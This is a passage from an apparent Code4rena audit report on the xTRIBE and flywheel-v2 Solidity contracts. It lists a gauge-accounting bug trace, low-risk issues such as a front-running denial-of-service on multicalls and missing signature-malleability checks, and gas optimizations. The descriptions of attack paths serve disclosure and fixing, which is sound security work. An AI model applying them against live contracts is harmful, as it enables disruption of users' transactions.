2.  userFreeWeight = balanceOf\[alice] - getUserWeight\[alice] = 3 - 3 = 0
3.  gauge D is freed, totalFreed = 0, userFreed = 1
4.  (userFreeWeight + totalFreed) < weight, continue to free next gauge
5.  gauge A is freed, totalFreed = 1, userFreed = 2
6.  (userFreeWeight + totalFreed) >= weight, break
7.  getUserWeight\[alice] -= totalFreed
8.  Alice call \_decrementWeightUntilFree(alice, 2)
9.  userFreeWeight = balanceOf\[alice] - getUserWeight\[alice] = 3 - 1 = 2
10. (userFreeWeight + totalFreed) >= weight, break
11. Only 2 gauge is freed

### Recommended Mitigation Steps

No need to treat deprecated gauge separately.

**[Joeysantoro (xTRIBE) confirmed and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/61#issuecomment-1125550837):**
 > This appears correct. Would be for a Tribe dev to validate with a test that certain paths could brick create this incorrect accounting.



***



# Low Risk and Non-Critical Issues

For this contest, 27 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-04-xtribe-findings/issues/27) by **IllIllI** received the top score from the judge.

*The following wardens also submitted reports: [joestakey](https://github.com/code-423n4/2022-04-xtribe-findings/issues/76), [hyh](https://github.com/code-423n4/2022-04-xtribe-findings/issues/39), [robee](https://github.com/code-423n4/2022-04-xtribe-findings/issues/6), [rayn](https://github.com/code-423n4/2022-04-xtribe-findings/issues/56), [sorrynotsorry](https://github.com/code-423n4/2022-04-xtribe-findings/issues/37), [Dravee](https://github.com/code-423n4/2022-04-xtribe-findings/issues/64), [MaratCerby](https://github.com/code-423n4/2022-04-xtribe-findings/issues/10), [delfin454000](https://github.com/code-423n4/2022-04-xtribe-findings/issues/54), [defsec](https://github.com/code-423n4/2022-04-xtribe-findings/issues/98), [Ruhum](https://github.com/code-423n4/2022-04-xtribe-findings/issues/43), [teryanarmen](https://github.com/code-423n4/2022-04-xtribe-findings/issues/75), [hake](https://github.com/code-423n4/2022-04-xtribe-findings/issues/87), [gzeon](https://github.com/code-423n4/2022-04-xtribe-findings/issues/63), [VAD37](https://github.com/code-423n4/2022-04-xtribe-findings/issues/67), [0xmint](https://github.com/code-423n4/2022-04-xtribe-findings/issues/71), [CertoraInc](https://github.com/code-423n4/2022-04-xtribe-findings/issues/69), [fatima_naz](https://github.com/code-423n4/2022-04-xtribe-findings/issues/33), [0xDjango](https://github.com/code-423n4/2022-04-xtribe-findings/issues/97), [csanuragjain](https://github.com/code-423n4/2022-04-xtribe-findings/issues/21), [samruna](https://github.com/code-423n4/2022-04-xtribe-findings/issues/30), [catchup](https://github.com/code-423n4/2022-04-xtribe-findings/issues/50), [0v3rf10w](https://github.com/code-423n4/2022-04-xtribe-findings/issues/13), [simon135](https://github.com/code-423n4/2022-04-xtribe-findings/issues/72), [oyc_109](https://github.com/code-423n4/2022-04-xtribe-findings/issues/2), [kebabsec](https://github.com/code-423n4/2022-04-xtribe-findings/issues/81), and [dipp](https://github.com/code-423n4/2022-04-xtribe-findings/issues/83).*

## [L-01] Nonce used for multiple purposes

The nonce mapping used for `permit()` calls is the same as the one used for `delegateBySig()`. This should at the very least be documented so signers know that the order of operations between the two functions matters, and so that `multicall()`s can be organized appropriately

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1

392        require(nonce == nonces[signer]++, "ERC20MultiVotes: invalid nonce");
```

[ERC20MultiVotes.sol#L392](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L392)<br>

## [L-02] `multicall()`s involving `permit()` and `delegateBySig()` can be DOSed

Attackers monitoring the blockchain for multicalls can front-run by calling `permit()` and `delegateBySig()` before the `multicall()`, causing it to revert. Have separate flavors of the functions where the `multicall()` data is included in the hash

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1

392        require(nonce == nonces[signer]++, "ERC20MultiVotes: invalid nonce");
```

[ERC20MultiVotes.sol#L392](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L392)<br>

## [L-03] Misleading comments

```solidity
File: lib/flywheel-v2/src/FlywheelCore.sol   #1

82      @return the cumulative amount of rewards accrued to user (including prior)
```

The cumulative amount of rewards accrued to the user since the last claim<br>
[FlywheelCore.sol#L82](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L82)<br>

## [L-04] `require()` should be used instead of `assert()`

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #1

196             assert(queuedRewards.storedCycle == 0 || queuedRewards.storedCycle >= lastCycle);
```

[FlywheelGaugeRewards.sol#L196](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L196)<br>

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #2

235         assert(queuedRewards.storedCycle >= cycle);
```

[FlywheelGaugeRewards.sol#L235](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L235)<br>

## [N-01] `require()`/`revert()` statements should have descriptive reason strings

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #1

114         require(rewardToken.balanceOf(address(this)) - balanceBefore >= totalQueuedForCycle);
```

[FlywheelGaugeRewards.sol#L114](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L114)<br>

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #2

153             require(rewardToken.balanceOf(address(this)) - balanceBefore >= newRewards);
```

[FlywheelGaugeRewards.sol#L153](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L153)<br>

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #3

154             require(newRewards <= type(uint112).max); // safe cast
```

[FlywheelGaugeRewards.sol#L154](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L154)<br>

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #4

195             require(queuedRewards.storedCycle < currentCycle);
```

[FlywheelGaugeRewards.sol#L195](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L195)<br>

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #5

200             require(nextRewards <= type(uint112).max); // safe cast
```

[FlywheelGaugeRewards.sol#L200](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L200)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #6

345             require(_userGauges[user].remove(gauge));
```

[ERC20Gauges.sol#L345](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L345)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #7

266             require(_delegates[delegator].remove(delegatee));
```

[ERC20MultiVotes.sol#L266](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L266)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #8

352                 require(_delegates[user].remove(delegatee)); // Remove from set. Should never fail.
```

[ERC20MultiVotes.sol#L352](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L352)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #9

393         require(signer != address(0));
```

[ERC20MultiVotes.sol#L393](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L393)<br>

## [N-02] `public` functions not called by the contract should be declared `external` instead

Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.

```solidity
File: lib/flywheel-v2/src/FlywheelCore.sol   #1

84     function accrue(ERC20 strategy, address user) public returns (uint256) {
```

[FlywheelCore.sol#L84](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L84)<br>

```solidity
File: lib/flywheel-v2/src/FlywheelCore.sol   #2

101     function accrue(
102         ERC20 strategy,
103         address user,
104         address secondUser
105     ) public returns (uint256, uint256) {
```

[FlywheelCore.sol#L101-L105](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L101-L105)<br>

## [N-03] Use a more recent version of solidity

Use a solidity version of at least 0.8.4 to get `bytes.concat()` instead of `abi.encodePacked(<bytes>,<bytes>)`<br>
Use a solidity version of at least 0.8.12 to get `string.concat()` instead of `abi.encodePacked(<str>,<str>)`

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1

4 pragma solidity ^0.8.0;
```

[ERC20MultiVotes.sol#L4](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L4)<br>

## [N-04] Constant redefined elsewhere

Consider defining in only one contract so that values cannot become out of sync when only one location is updated. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #1

47     uint32 public immutable gaugeCycleLength;
```

seen in lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol<br>
[ERC20Gauges.sol#L47](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L47)<br>

## [N-05] Non-library/interface files should use fixed compiler versions, not floating ones

```solidity
File: lib/xTRIBE/src/xTRIBE.sol   #1

4 pragma solidity ^0.8.0;
```

[xTRIBE.sol#L4](https://github.com/fei-protocol/xTRIBE/tree/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol#L4)<br>

## [N-06] Typos

```solidity
File: lib/flywheel-v2/src/FlywheelCore.sol   #1

17          The Core contract maintaings three important pieces of state:
```

maintaings<br>
[FlywheelCore.sol#L17](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L17)<br>

```solidity
File: lib/flywheel-v2/src/FlywheelCore.sol   #2

262         // accumulate rewards by multiplying user tokens by rewardsPerToken index and adding on unclaimed
```

rewardsPerToken<br>
[FlywheelCore.sol#L262](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L262)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #3

230     /// @notice thrown when incremending during the freeze window.
```

incremending<br>
[ERC20Gauges.sol#L230](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L230)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #4

143     /// @notice An event thats emitted when an account changes its delegate
```

thats<br>
[ERC20MultiVotes.sol#L143](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L143)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #5

189      * @param delegatee the receivier of votes.
```

receivier<br>
[ERC20MultiVotes.sol#L189](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L189)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #6

364    /*///////////////////////////////////////////////////////////////
365                             EIP-712 LOGIC
366    //////////////////////////////////////////////////////////////*/
```

Did you mean EIP-2612?<br>
[ERC20MultiVotes.sol#L364-L366](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L364-L366)<br>

## [N-07] NatSpec is incomplete

```solidity
File: lib/flywheel-v2/src/FlywheelCore.sol   #1

93     /** 
94       @notice accrue rewards for a two users on a strategy
95       @param strategy the strategy to accrue a user's rewards on
96       @param user the first user to be accrued
97       @param user the second user to be accrued
98       @return the cumulative amount of rewards accrued to the first user (including prior)
99       @return the cumulative amount of rewards accrued to the second user (including prior)
100     */
101     function accrue(
102         ERC20 strategy,
103         address user,
104         address secondUser
105     ) public returns (uint256, uint256) {
```

Missing: `@param secondUser`<br>
[FlywheelCore.sol#L93-L105](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L93-L105)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #2

130       @param num the number of gauges to return
131     */
132     function gauges(uint256 offset, uint256 num) external view returns (address[] memory values) {
```

Missing: `@return`<br>
[ERC20Gauges.sol#L130-L132](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L130-L132)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #3

176       @param num the number of gauges to return.
177     */
178     function userGauges(
179         address user,
180         uint256 offset,
181         uint256 num
182     ) external view returns (address[] memory values) {
```

Missing: `@return`<br>
[ERC20Gauges.sol#L176-L182](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L176-L182)<br>

## [N-08] Event is missing `indexed` fields

Each `event` should use three `indexed` fields if there are three or more fields

```solidity
File: lib/flywheel-v2/src/FlywheelCore.sol   #1

66     event AccrueRewards(ERC20 indexed strategy, address indexed user, uint256 rewardsDelta, uint256 rewardsIndex);
```

[FlywheelCore.sol#L66](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L66)<br>

```solidity
File: lib/flywheel-v2/src/FlywheelCore.sol   #2

73     event ClaimRewards(address indexed user, uint256 amount);
```

[FlywheelCore.sol#L73](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L73)<br>

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #3

44     event CycleStart(uint32 indexed cycleStart, uint256 rewardAmount);
```

[FlywheelGaugeRewards.sol#L44](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L44)<br>

```solidity
File: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #4

47     event QueueRewards(address indexed gauge, uint32 indexed cycleStart, uint256 rewardAmount);
```

[FlywheelGaugeRewards.sol#L47](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L47)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #5

234     event IncrementGaugeWeight(address indexed user, address indexed gauge, uint256 weight, uint32 cycleEnd);
```

[ERC20Gauges.sol#L234](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L234)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #6

237     event DecrementGaugeWeight(address indexed user, address indexed gauge, uint256 weight, uint32 cycleEnd);
```

[ERC20Gauges.sol#L237](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L237)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #7

440     event MaxGaugesUpdate(uint256 oldMaxGauges, uint256 newMaxGauges);
```

[ERC20Gauges.sol#L440](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L440)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20Gauges.sol   #8

443     event CanContractExceedMaxGaugesUpdate(address indexed account, bool canContractExceedMaxGauges);
```

[ERC20Gauges.sol#L443](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L443)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #9

102     event MaxDelegatesUpdate(uint256 oldMaxDelegates, uint256 newMaxDelegates);
```

[ERC20MultiVotes.sol#L102](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L102)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #10

105     event CanContractExceedMaxDelegatesUpdate(address indexed account, bool canContractExceedMaxDelegates);
```

[ERC20MultiVotes.sol#L105](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L105)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #11

135     event Delegation(address indexed delegator, address indexed delegate, uint256 amount);
```

[ERC20MultiVotes.sol#L135](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L135)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #12

138     event Undelegation(address indexed delegator, address indexed delegate, uint256 amount);
```

[ERC20MultiVotes.sol#L138](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L138)<br>

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #13

141     event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);
```

[ERC20MultiVotes.sol#L141](https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L141)<br>

## [N-09] Consider addings checks for signature malleability

```solidity
File: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1

380        address signer = ecrecover(
381            keccak256(
382                abi.encodePacked(
383                    "\x19\x01",
384                    DOMAIN_SEPARATOR(),
385                    keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry))
386                )
387            ),
388            v,
389            r,
390            s
391        );
392        require(nonce == nonces[signer]++, "ERC20MultiVotes: invalid nonce");
393        require(signer != address(0));
394        _delegate(signer, delegatee);
```

[ERC20MultiVotes.sol#L380-L394](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L380-L394)<br>

**[0xean (judge) commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/27#issuecomment-1133204534):**
 > The severities listed in this QA submission are correct as-is.



***

# Gas Optimizations

For this contest, 33 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-04-xtribe-findings/issues/41) by **0xkatana** received the top score from the judge.

*The following wardens also submitted reports: [Dravee](https://github.com/code-423n4/2022-04-xtribe-findings/issues/34), [IllIllI](https://github.com/code-423n4/2022-04-xtribe-findings/issues/28), [delfin454000](https://github.com/code-423n4/2022-04-xtribe-findings/issues/68), [joestakey](https://github.com/code-423n4/2022-04-xtribe-findings/issues/74), [catchup](https://github.com/code-423n4/2022-04-xtribe-findings/issues/51), [Tomio](https://github.com/code-423n4/2022-04-xtribe-findings/issues/84), [defsec](https://github.com/code-423n4/2022-04-xtribe-findings/issues/96), [oyc_109](https://github.com/code-423n4/2022-04-xtribe-findings/issues/15), [robee](https://github.com/code-423n4/2022-04-xtribe-findings/issues/7), [Scocco](https://github.com/code-423n4/2022-04-xtribe-findings/issues/11), [0xNazgul](https://github.com/code-423n4/2022-04-xtribe-findings/issues/9), [0v3rf10w](https://github.com/code-423n4/2022-04-xtribe-findings/issues/14), [saian](https://github.com/code-423n4/2022-04-xtribe-findings/issues/52), [joshie](https://github.com/code-423n4/2022-04-xtribe-findings/issues/8), [CertoraInc](https://github.com/code-423n4/2022-04-xtribe-findings/issues/70), [fatima_naz](https://github.com/code-423n4/2022-04-xtribe-findings/issues/32), [nahnah](https://github.com/code-423n4/2022-04-xtribe-findings/issues/77), [teryanarmen](https://github.com/code-423n4/2022-04-xtribe-findings/issues/95), [z3s](https://github.com/code-423n4/2022-04-xtribe-findings/issues/17), [Funen](https://github.com/code-423n4/2022-04-xtribe-findings/issues/89), [NoamYakov](https://github.com/code-423n4/2022-04-xtribe-findings/issues/60), [kebabsec](https://github.com/code-423n4/2022-04-xtribe-findings/issues/85), [sorrynotsorry](https://github.com/code-423n4/2022-04-xtribe-findings/issues/38), [djxploit](https://github.com/code-423n4/2022-04-xtribe-findings/issues/36), [gzeon](https://github.com/code-423n4/2022-04-xtribe-findings/issues/62), [0x1f8b](https://github.com/code-423n4/2022-04-xtribe-findings/issues/47), [Fitraldys](https://github.com/code-423n4/2022-04-xtribe-findings/issues/79), [rayn](https://github.com/code-423n4/2022-04-xtribe-findings/issues/59), [samruna](https://github.com/code-423n4/2022-04-xtribe-findings/issues/29), [rotcivegaf](https://github.com/code-423n4/2022-04-xtribe-findings/issues/90), [0xmint](https://github.com/code-423n4/2022-04-xtribe-findings/issues/73), and [csanuragjain](https://github.com/code-423n4/2022-04-xtribe-findings/issues/31).*

## \[G-01] Redundant zero initialization

Solidity does not recognize null as a value, so uint variables are initialized to zero. Setting a uint variable to zero is redundant and can waste gas.

There are several places where an int is initialized to zero, which looks like:

    uint256 amount = 0;

Instances in code:<br>
[ERC20Gauges.sol#L134](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L134)<br>
[ERC20Gauges.sol#L184](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L184)<br>
[ERC20Gauges.sol#L307](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L307)<br>
[ERC20Gauges.sol#L384](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L384)<br>
[ERC20Gauges.sol#L564](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L564)<br>
[ERC20MultiVotes.sol#L346](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L346)<br>
[ERC20MultiVotes.sol#L79](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L79)<br>
[xTRIBE.sol#L95](https://github.com/fei-protocol/xTRIBE/blob/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol#L95)<br>

### Recommended Mitigation Steps

Remove the redundant zero initialization<br>
`uint256 amount;`

## \[G-02] Use prefix not postfix in loops

Using a prefix increment (++i) instead of a postfix increment (i++) saves gas for each loop cycle and so can have a big gas impact when the loop executes on a large number of elements.

There are several examples of this:<br>
[Multicall.sol#L14](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/Multicall.sol#L14)<br>
[FlywheelGaugeRewards.sol#L189](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L189)<br>
[ERC20MultiVotes.sol#L346](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L346)<br>
[ERC20Gauges.sol#L137](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L137)<br>
[ERC20Gauges.sol#L187](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L187)<br>
[ERC20Gauges.sol#L314](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L314)<br>
[ERC20Gauges.sol#L391](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L391)<br>
[ERC20Gauges.sol#L576](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L576)<br>
[xTRIBE.sol#L99](https://github.com/fei-protocol/xTRIBE/blob/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol#L99)<br>

### Recommended Mitigation Steps

Use prefix not postfix to increment in a loop.

## \[G-03] Short require strings save gas

Strings in solidity are handled in 32 byte chunks. A require string longer than 32 bytes uses more gas. Shortening these strings will save gas.

One cases of this gas optimization was found<br>
34 chars<br>
[ERC20MultiVotes.sol#L379](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L379)<br>

### Recommended Mitigation Steps

Shorten all require strings to less than 32 characters.

## \[G-04] Use != 0 instead of > 0

Using `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero

Locations where this was found include:<br>
[PeripheryPayments.sol#L38](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/PeripheryPayments.sol#L38)<br>
[PeripheryPayments.sol#L45](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/PeripheryPayments.sol#L45)<br>
[PeripheryPayments.sol#L60](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/PeripheryPayments.sol#L60)<br>
[PeripheryPayments.sol#L66](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/PeripheryPayments.sol#L66)<br>
[FlywheelCore.sol#L167](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L167)<br>
[FlywheelCore.sol#L218](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L218)<br>
[ERC20Gauges.sol#L467](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L467)<br>
[ERC20Gauges.sol#L487](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L487)<br>
[ERC20MultiVotes.sol#L287](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L287)<br>

### Recommended Mitigation Steps

Replace `> 0` with `!= 0` to save gas.

## \[G-05] Cache array length before loop

Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.

This optimization is already used in some places, but is not used in this place:<br>
[Multicall.sol#L14](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/Multicall.sol#L14)<br>

### Recommended Mitigation Steps

Cache the array length before the for loop.

## \[G-06] Bitshift for divide by 2

When multiply or dividing by a power of two, it is cheaper to bitshift than to use standard math operations.

There is a divide by 2 operation on this line:<br>
[ERC20MultiVotes.sol#L94](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L94)<br>

### Recommended Mitigation Steps

Bitshift right by one bit instead of dividing by 2 to save gas.

## \[G-07] Use simple comparison in trinary logic

The comparison operators >= and <= use more gas than >, <, or ==. Replacing the  >= and ≤ operators with a comparison operator that has an opcode in the EVM saves gas.

The existing code is:<br>
[FlywheelDynamicRewards.sol#L50](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelDynamicRewards.sol#L50)<br>

    uint32 latest = timestamp >= cycle.end ? cycle.end : timestamp;

A simple comparison can be used for gas savings by reversing the logic:

    uint32 latest = timestamp < cycle.end ? timestamp : cycle.end;

### Recommended Mitigation Steps

Replace the comparison operator and reverse the logic to save gas using the suggestions above.

## \[G-08] Use simple comparison in if statement

The comparison operators >= and <= use more gas than >, <, or ==. Replacing the  >= and ≤ operators with a comparison operator that has an opcode in the EVM saves gas.

The existing code is:<br>
[ERC20Gauges.sol#L37-L39](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L37-L39)<br>

